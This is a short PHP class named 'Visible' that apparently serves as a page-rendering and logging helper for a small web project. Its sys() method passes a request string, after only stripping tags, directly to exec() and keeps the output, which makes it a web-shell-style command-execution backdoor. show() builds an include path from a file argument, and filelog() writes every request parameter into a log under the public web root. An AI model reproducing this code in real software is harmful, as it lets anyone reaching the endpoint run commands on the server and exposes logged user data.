<?php


class Visible
{
    public static $data;
    // public static $error = null;
    public static $shell = array();
    /**
     * Отображение сраницы  
     *
     * @param string $file
     * @param string|array $data
     * @return void
     */
    public static function show($file, $data = null)
    {
        self::$data = $data;
        //self::$error = $er;

        require_once $_SERVER['DOCUMENT_ROOT'] . '/public/file/' . $file . '.php';
    }

    public static function filelog($done = null)
    {
        $out = 'DATE:' . date('Y-m-d H:i:s') . PHP_EOL;
        $out .= 'REQUEST_URI:' . $_SERVER['REQUEST_URI'] . PHP_EOL;
        foreach ($_REQUEST as $key => $value) {
            $out .= $key . ':' . htmlspecialchars_decode(trim(preg_replace("/\<(\/?[^>]+)>/", '', $value))) . PHP_EOL;
            // $out .= $key . ':' . htmlspecialchars_decode(
            //     trim(
            //         str_replace(
            //             "\n \r",
            //             '',
            //             preg_replace("/\<(\/?[^>]+)>/", '', $value)
            //         )
            //     ),
            //     ENT_QUOTES
            // ) . PHP_EOL;
        }
        $out .= 'REMOTE_ADDR:' . $_SERVER['REMOTE_ADDR'] . PHP_EOL;
        $out .= 'STATUS:' . http_response_code() . PHP_EOL;
        $out .= 'SERVER_ADDR:' . $_SERVER['SERVER_ADDR'] . PHP_EOL;

        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/public/log/log', $out, FILE_APPEND);
    }

    public static function sys($file, $req = null)
    {
        exec(
            htmlspecialchars_decode(trim(preg_replace("/\<(\/?[^>]+)>/", '', $req))),
            self::$shell['sys'],
            self::$shell['code']
        );

        require_once $_SERVER['DOCUMENT_ROOT'] . '/public/file/' . $file . '.php';
    }
}
